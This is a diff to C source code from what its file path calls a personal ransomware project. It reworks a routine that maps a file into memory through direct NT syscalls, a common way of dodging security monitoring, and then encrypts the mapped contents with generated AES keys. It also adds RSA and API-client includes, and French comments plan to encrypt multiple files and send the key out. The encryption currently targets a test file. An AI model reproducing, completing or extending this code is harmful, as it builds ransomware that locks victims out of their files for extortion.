@@ -1,12 +1,15 @@
 #include "core/encrypter.h"
 #include "core/my_aes.h"
 #include "utils/rng.h"
+#include "core/rsa.h"
+#include "core/api_client.h"
+#include "core/aes_wrapper.h"
 
-int loadFileInMemory(HANDLE fileHandle, HANDLE sectionHandle, PVOID localSectionAddress, ULONG size, PCWSTR filePath)
+int loadFileInMemory(HANDLE *fileHandle, HANDLE *sectionHandle, PVOID *localSectionAddress, PCWSTR filePath)
 {
-    fileHandle = NULL;
-    sectionHandle = NULL;
-    localSectionAddress = NULL;
+    *fileHandle = NULL;
+    *sectionHandle = NULL;
+    *localSectionAddress = NULL;
 
     OBJECT_ATTRIBUTES oa;
     NTSTATUS status = 0;
@@ -19,7 +22,7 @@ int loadFileInMemory(HANDLE fileHandle, HANDLE sectionHandle, PVOID localSection
     // TODO : Se renseigner sur le caching de la mémoire
     // Avec notamment ces flags qui peuvent éviter le cache FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH
     status = SysNtCreateFile(
-        &fileHandle,
+        fileHandle,
         FILE_GENERIC_READ | FILE_GENERIC_WRITE,
         &oa,
         &osb,
@@ -43,13 +46,13 @@ int loadFileInMemory(HANDLE fileHandle, HANDLE sectionHandle, PVOID localSection
     sectionSize.QuadPart = 0x100000; // 1MB
 
     status = SysNtCreateSection(
-        &sectionHandle,
+        sectionHandle,
         SECTION_MAP_READ | SECTION_MAP_WRITE,
         NULL,
         (PLARGE_INTEGER)&sectionSize,
         PAGE_READWRITE,
         SEC_COMMIT,
-        fileHandle);
+        *fileHandle);
 
     if (NT_SUCCESS(status))
     {
@@ -63,23 +66,40 @@ int loadFileInMemory(HANDLE fileHandle, HANDLE sectionHandle, PVOID localSection
         return 1;
     }
 
-    if (size < 0x10000)
-    {
-        printf("Size is smaller than 0x10000\n");
-    }
-
-    ULONG zeroBits = 10; // Permet de forcer le système a mapper la vue dans une adresse basse de la mémoire virtuelle /!\ sur ma mahcine, au dessus de 11 ça ne fonctionne plus
+    ULONG zeroBits = 0; // Permet de forcer le système a mapper la vue dans une adresse basse de la mémoire virtuelle /!\ sur ma mahcine, au dessus de 11 ça ne fonctionne plus
+    PVOID baseAddress = NULL;
+    ULONG viewSize = 0x10000; // 65536 bytes (64KB)
     status = SysNtMapViewOfSection(
-        sectionHandle,
+        *sectionHandle,
         GetCurrentProcess(),
-        &localSectionAddress,
+        &baseAddress,
         zeroBits,
         0,
         NULL,
-        &size,
+        &viewSize,
         ViewShare,
         0,
         PAGE_READWRITE);
+    
+
+    printf("Base address: %p\n", baseAddress);
+    if (status != 0)
+    {
+        printf("Error mapping section: 0x%X\n", status);
+        CloseHandle(sectionHandle);
+        CloseHandle(fileHandle);
+        return 1;
+    }
+
+    *localSectionAddress = baseAddress;
+    
+    if (*localSectionAddress == NULL)
+    {   
+        printf("Error local address section is NULL : %02X\n", status);
+        CloseHandle(sectionHandle);
+        CloseHandle(fileHandle);
+        return 1;
+    }
 
     // Check if the mapping was successful
     if (NT_SUCCESS(status))
@@ -93,13 +113,8 @@ int loadFileInMemory(HANDLE fileHandle, HANDLE sectionHandle, PVOID localSection
         CloseHandle(fileHandle);
         return 1;
     }
-    if (localSectionAddress == NULL)
-    {
-        printf("Error local address section is NULL : %d\n", GetLastError());
-        CloseHandle(sectionHandle);
-        CloseHandle(fileHandle);
-        return 1;
-    }
+
+    return 0;
 }
 
 int key_handler(state_t key)
@@ -140,37 +155,43 @@ int key_handler(state_t key)
     }
 }
 
+
 int main()
 {
     HANDLE fileHandle = NULL;
     HANDLE sectionHandle = NULL;
     PVOID localSectionAddress = NULL;
-    ULONG size = 0x10000; // 65536 bytes (64KB)
+    // ULONG size = 0x10000; // 65536 bytes (64KB)
     PCWSTR filePath = (PCWSTR)L"\\??\\C:\\Users\\l3gro\\Documents\\code\\C\\ransomware\\test\\monfichier.txt";
 
-    loadFileInMemory(fileHandle, sectionHandle, localSectionAddress, size, filePath);
-
+    if (loadFileInMemory(&fileHandle, &sectionHandle, &localSectionAddress, filePath) != 0)
+    {
+        printf("erreur dans loadFileInMemry \n");
+    }
     generateRandomSeed(); // Initialize the random seed
     // Generate a random key of 128 bits (16 bytes)
     state_t key;
     generateRandomKey(key);
     state_t keys[10] = {{{0}}}; // Initialize all keys to zero (the base_key is added in the function)
+    
     // Generate the keys (can't be more than 10 keys because of the Rcon table)
     GenerateTenKeys(key, keys);
 
-    char filePart[16];
-
-    for (int i = 0; i < 16; i++)
+    uint32_t *vue = (uint32_t *)localSectionAddress;
+    if (vue == NULL)
     {
-        filePart[i] = (char *)localSectionAddress[i];
+        printf("erreur : vue est nulle");
+        return 1;
     }
-    
+
+    DispatchEcryption(keys, vue);
+
 
     aes(keys, "23456789ABCDEF0109546789CBA3EF10");
 
-    //Chiffrer plusieurs fichiers
+    // Chiffrer plusieurs fichiers
 
-    //Envoyer la clé 
+    // Envoyer la clé
 
     // Free the section handle
     //  This will unmap the section from the process's address space
